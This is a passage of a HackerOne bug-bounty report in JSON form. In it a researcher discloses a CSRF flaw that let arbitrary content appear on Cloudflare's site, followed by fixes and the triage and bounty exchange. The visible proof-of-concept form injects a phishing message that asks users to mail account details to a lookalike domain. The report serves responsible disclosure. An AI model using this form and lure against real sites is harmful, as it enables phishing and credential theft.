class=\"s\"\u003e\u0026quot;Hello\u0026amp;#32;cloudlare\u0026amp;#32;user\u0026amp;#44;\u0026amp;#10;We\u0026amp;apos;ve\u0026amp;#32;detected\u0026amp;#32;a\u0026amp;#32;problem\u0026amp;#32;with\u0026amp;#32;your\u0026amp;#32;account\u0026amp;#46;\u0026amp;#10;Please\u0026amp;#32;send\u0026amp;#32;us\u0026amp;#32;your\u0026amp;#32;account\u0026amp;#32;details\u0026amp;#32;to\u0026amp;#32;support\u0026amp;#32;\u0026amp;#64;\u0026amp;#32;cloudfllare\u0026amp;#46;com\u0026amp;#46;\u0026amp;#10;\u0026amp;#10;Thanks\u0026amp;#44;\u0026amp;#10;The\u0026amp;#32;clouddlare\u0026amp;#32;support\u0026amp;#32;team\u0026amp;#46;\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n      \u003cspan class=\"nt\"\u003e\u0026lt;input\u003c/span\u003e \u003cspan class=\"na\"\u003etype=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;submit\u0026quot;\u003c/span\u003e \u003cspan class=\"na\"\u003evalue=\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026quot;Submit request\u0026quot;\u003c/span\u003e \u003cspan class=\"nt\"\u003e/\u0026gt;\u003c/span\u003e\n    \u003cspan class=\"nt\"\u003e\u0026lt;/form\u0026gt;\u003c/span\u003e\n  \u003cspan class=\"nt\"\u003e\u0026lt;/body\u0026gt;\u003c/span\u003e\n\u003cspan class=\"nt\"\u003e\u0026lt;/html\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eLet\u0026#39;s save it as \u003ccode\u003e/tmp/csrf.html\u003c/code\u003e and open it in a new tab: \u003ccode\u003efirefox /tmp/csrf.html\u003c/code\u003e\u003c/p\u003e\n\n\u003cp\u003eThis should look like \u0026quot;cloudflare_poc_1.png\u0026quot;. The submit button is just for testing purposes. Normally an attacker would fire the form automatically when visiting the exploit.\u003c/p\u003e\n\n\u003cp\u003eThe final result should look like this. \u0026quot;cloudflare_poc_2.png\u0026quot;.\u003c/p\u003e\n\n\u003cp\u003eAs you can see, we can display abitary content on the cloudflare website for every authenticated user. This could be used for some kind of phishing.\u003cbr\u003e\nIt\u0026#39;s a very low critical issue, though.\u003c/p\u003e\n\n\u003ch2 id=\"how-to-fix\"\u003eHow to fix:\u003c/h2\u003e\n\n\u003cp\u003eAs mentioned  in my original post, there are some ways to fix this problem:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eImplement a CSRF protection or validate the X-Requested-With header. This way, I can\u0026#39;t send my abitary content to my victim.\u003c/li\u003e\n\u003cli\u003eHardcode the embedded response and send a \u003ccode\u003econtent_id\u003c/code\u003e parameter which will then display the correct message. This way I can\u0026#39;t change the content of the response.\u003c/li\u003e\n\u003cli\u003eSet a proper \u003ccode\u003eContent-Type\u003c/code\u003e. As the content will be embedded into the requesting website by some javascript, you could change the \u003ccode\u003eContent-Type\u003c/code\u003e of the response to \u003ccode\u003etext/plain\u003c/code\u003e. This way my victim would see the whole HTML sourcecode. Nobody would follow the instructions anymore.\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eI hope that helps,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-04-26T20:10:49.332Z","updated_at":"2014-04-26T20:10:49.332Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":7696,"filename":"cloudflare_poc_1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/007/696/82e39be4a3ce2d3d52b565ab38834aa27efea4b0/cloudflare_poc_1.png?response-content-disposition=attachment%3B%20filename%3D%22cloudflare_poc_1.png%22%3B%20filename%2A%3DUTF-8%27%27cloudflare_poc_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2OMFY4UK%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070516Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHxGZs2clTLUwAwfUNO3jNpJ1hXCcgPBPW9XdCt56%2F6nAiEArb%2Fpi%2FuoJExDEuec%2BMMhPg7c52t%2FJNvsqizdYTtRksAqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDIBEoZQ2Enrnpk7OeSqRA9ZZ33ypLsbFZSISTENDiOZceHd0C%2BWVOcUaVCzba%2FWi9OygOr%2FK3IEMLP7UZuDkOHeWHmnsYCUOTZHVY3hOKp9fkHne2uDfmQ4WZIUvjKLbkKSut3TutdB10RnRZfwE9%2BxI1R8bSxh%2FlZlxSM%2BFkjBZCIZdbYa77JAmJoNL44S9v98MsMkkNPLzbMh2MMGJZz3nqjak2XN3LUlR5JX65hA6LSJtBOHo82L46AzRBormvnJlfVqBy69QCA0HauNX9TbDLZ9AhOZoqYDfFY3azGXq%2B7R5dtJZoQnWiNqDWk6LzqtPdgq5O3eWwk3PpZjxznT5IXMKd1vRg1nW05S7P94oAnrAJgEjiStpBTapYqJODg1NEhUYkBwFREVdF1u1KuuR75p5hZeTUkMFqcYHj%2F0UA4PZTRAYHyeYPB3Q2BcVTG2dlcMUcU7YAMR8FhxqlcKeVuOtWK3lFSpXo2bwQiwZBB8a0jKH91wx%2BUGuJ1kDN%2BNdAzM5whUXc8CxEkozRy%2FqK7C70it7JRpueHL%2B5ttZMPKeq%2F8FOusBNhe3g4Ea3FOEHLr5F2uSSYP2IFrP89oZ06d5fEz%2BBHu2MbmVB6d%2FnyljrYYVnkDUNpBn1DUs4TTSg4hU%2FhMk4HceVRGV4QKOMTrK%2FDNdVx%2BSjsCBmB00BSgi7FHzSgAKYLsQ6GntGNPDgpDWfrKdb7J%2Fts3SrP35%2BfkSSmetVoRz%2FCB6QzP7uqk%2F8Fc5bA4vVnwfiRXfB9HRkk1bTZC9tXthVYrFZCwLx8H9tbGjIhyQgxjQwlDz4XGJMXq1yUCu002iV6DR48%2Bj1sn8ZLgGJnOXuog%2B6v4cpRvUDLTGNLnpwUplzx5tl38gZw%3D%3D\u0026X-Amz-Signature=18b5acc10c0f3db2a83ee47f43a92bdfeab2a7098f26bfa766706e52cf9e3e0f"},{"id":7697,"filename":"cloudflare_poc_2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/007/697/6a8d229f3c4e2d5f64b577ce0d62c6e46a89cf72/cloudflare_poc_2.png?response-content-disposition=attachment%3B%20filename%3D%22cloudflare_poc_2.png%22%3B%20filename%2A%3DUTF-8%27%27cloudflare_poc_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ2OMFY4UK%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070516Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIHxGZs2clTLUwAwfUNO3jNpJ1hXCcgPBPW9XdCt56%2F6nAiEArb%2Fpi%2FuoJExDEuec%2BMMhPg7c52t%2FJNvsqizdYTtRksAqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDIBEoZQ2Enrnpk7OeSqRA9ZZ33ypLsbFZSISTENDiOZceHd0C%2BWVOcUaVCzba%2FWi9OygOr%2FK3IEMLP7UZuDkOHeWHmnsYCUOTZHVY3hOKp9fkHne2uDfmQ4WZIUvjKLbkKSut3TutdB10RnRZfwE9%2BxI1R8bSxh%2FlZlxSM%2BFkjBZCIZdbYa77JAmJoNL44S9v98MsMkkNPLzbMh2MMGJZz3nqjak2XN3LUlR5JX65hA6LSJtBOHo82L46AzRBormvnJlfVqBy69QCA0HauNX9TbDLZ9AhOZoqYDfFY3azGXq%2B7R5dtJZoQnWiNqDWk6LzqtPdgq5O3eWwk3PpZjxznT5IXMKd1vRg1nW05S7P94oAnrAJgEjiStpBTapYqJODg1NEhUYkBwFREVdF1u1KuuR75p5hZeTUkMFqcYHj%2F0UA4PZTRAYHyeYPB3Q2BcVTG2dlcMUcU7YAMR8FhxqlcKeVuOtWK3lFSpXo2bwQiwZBB8a0jKH91wx%2BUGuJ1kDN%2BNdAzM5whUXc8CxEkozRy%2FqK7C70it7JRpueHL%2B5ttZMPKeq%2F8FOusBNhe3g4Ea3FOEHLr5F2uSSYP2IFrP89oZ06d5fEz%2BBHu2MbmVB6d%2FnyljrYYVnkDUNpBn1DUs4TTSg4hU%2FhMk4HceVRGV4QKOMTrK%2FDNdVx%2BSjsCBmB00BSgi7FHzSgAKYLsQ6GntGNPDgpDWfrKdb7J%2Fts3SrP35%2BfkSSmetVoRz%2FCB6QzP7uqk%2F8Fc5bA4vVnwfiRXfB9HRkk1bTZC9tXthVYrFZCwLx8H9tbGjIhyQgxjQwlDz4XGJMXq1yUCu002iV6DR48%2Bj1sn8ZLgGJnOXuog%2B6v4cpRvUDLTGNLnpwUplzx5tl38gZw%3D%3D\u0026X-Amz-Signature=f202f04ccc9d9fbba922a9ad9c06c4c2c2de2854b2e2b429f0dc79ed9a7c9a4c"}],"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":51208,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"Thank you, our engineers continue to review here.","markdown_message":"\u003cp\u003eThank you, our engineers continue to review here.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-05-14T21:51:31.178Z","updated_at":"2014-05-14T21:51:31.178Z","actor":{"username":"justin","cleared":false,"url":"/justin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/714/460ff848ebf95933694f8e6c967854da33ee949e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":52597,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2014-05-16T22:32:56.170Z","updated_at":"2014-05-16T22:32:56.170Z","actor":{"username":"justin","cleared":false,"url":"/justin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/714/460ff848ebf95933694f8e6c967854da33ee949e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":64594,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"We believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We'll follow up with you in the near future to determine if this submission was eligible under our bug bounty program. Thank you!","markdown_message":"\u003cp\u003eWe believe this issue has been resolved. Please take a moment to reassess and let us know if you disagree. We\u0026#39;ll follow up with you in the near future to determine if this submission was eligible under our bug bounty program. Thank you!\u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-03T05:35:35.415Z","updated_at":"2014-06-03T05:35:35.415Z","actor":{"username":"dknecht","cleared":false,"url":"/dknecht","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"internetwache","url":"/internetwache"},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":64732,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dknecht,\nI'll retest the vulnerability later today and let you know the outcome.\n\nPlease also consider that this particular endpoint was vulnerable to XSS attacks. My investigation regarding to this attack vector wasn't too indepth, and that's why I referer to the writeup from Osanda Malith:\nhttp://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/\n\nThanks,\nSebastian","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dknecht\"\u003e@dknecht\u003c/a\u003e,\u003cbr\u003e\nI\u0026#39;ll retest the vulnerability later today and let you know the outcome.\u003c/p\u003e\n\n\u003cp\u003ePlease also consider that this particular endpoint was vulnerable to XSS attacks. My investigation regarding to this attack vector wasn\u0026#39;t too indepth, and that\u0026#39;s why I referer to the writeup from Osanda Malith:\u003cbr\u003e\n\u003ca title=\"http://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/\" href=\"/redirect?url=http%3A%2F%2Fosandamalith.wordpress.com%2F2014%2F05%2F31%2Fxss-in-cloudflare%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://osandamalith.wordpress.com/2014/05/31/xss-in-cloudflare/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-03T07:59:15.439Z","updated_at":"2014-06-03T07:59:15.439Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":65352,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @dknecht,\nit seems like the issue has been resolved.\n\nThanks,\nSebastian","markdown_message":"\u003cp\u003eHi \u003ca href=\"/dknecht\"\u003e@dknecht\u003c/a\u003e,\u003cbr\u003e\nit seems like the issue has been resolved.\u003c/p\u003e\n\n\u003cp\u003eThanks,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-06-03T18:28:52.102Z","updated_at":"2014-06-03T18:28:52.102Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":68962,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-06-07T18:24:18.372Z","updated_at":"2014-06-07T18:24:18.372Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":85900,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2014-07-08T10:00:22.938Z","updated_at":"2014-07-08T10:00:22.938Z","actor":{"url":"/cloudflare","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/041/a819f0d518a4854df667be26210167805f38a6a4_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Cloudflare Vulnerability Disclosure"}},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":99079,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi,\n\nAs an update here, this issue was accepted and corrected. \n\nWe will be in touch regarding the bounty for the report.","markdown_message":"\u003cp\u003eHi,\u003c/p\u003e\n\n\u003cp\u003eAs an update here, this issue was accepted and corrected. \u003c/p\u003e\n\n\u003cp\u003eWe will be in touch regarding the bounty for the report.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-01T16:40:57.017Z","updated_at":"2014-08-01T16:40:57.017Z","actor":{"username":"justin","cleared":false,"url":"/justin","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/714/460ff848ebf95933694f8e6c967854da33ee949e_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":99084,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @justin,\nthanks for the update!\n\nI'll be on vacation from this sunday, so please do not wonder if I do not reply within the next 3 weeks or so :)\n\nLooking forward to the bounty.\n\nBest regards,\nSebastian","markdown_message":"\u003cp\u003eHi \u003ca href=\"/justin\"\u003e@justin\u003c/a\u003e,\u003cbr\u003e\nthanks for the update!\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;ll be on vacation from this sunday, so please do not wonder if I do not reply within the next 3 weeks or so :)\u003c/p\u003e\n\n\u003cp\u003eLooking forward to the bounty.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-01T16:43:13.540Z","updated_at":"2014-08-01T16:43:13.540Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":103151,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"We apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.","markdown_message":"\u003cp\u003eWe apologize for the delay in reward fulfillment, but look out for an email requesting your shirt size, address, and other information needed for fulfillment next week. Thank you.\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-08T16:56:14.225Z","updated_at":"2014-08-08T16:56:14.225Z","actor":{"username":"jamie","cleared":false,"url":"/jamie","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/003/767/528e88f7a06a6bbbae2b2b37dbb7649c9486c404_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":114475,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @jamie,\nthanks for the note!\n\nI got the email and will reply in the next couple of days.\n\nBest regards,\nSebastian","markdown_message":"\u003cp\u003eHi \u003ca href=\"/jamie\"\u003e@jamie\u003c/a\u003e,\u003cbr\u003e\nthanks for the note!\u003c/p\u003e\n\n\u003cp\u003eI got the email and will reply in the next couple of days.\u003c/p\u003e\n\n\u003cp\u003eBest regards,\u003cbr\u003e\nSebastian\u003c/p\u003e\n","automated_response":false,"created_at":"2014-08-23T15:52:53.554Z","updated_at":"2014-08-23T15:52:53.554Z","actor":{"username":"internetwache","cleared":false,"url":"/internetwache","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/001/637/e5a294547160a5c885e21dacc358769675c8b0e9_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"cloudflare","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}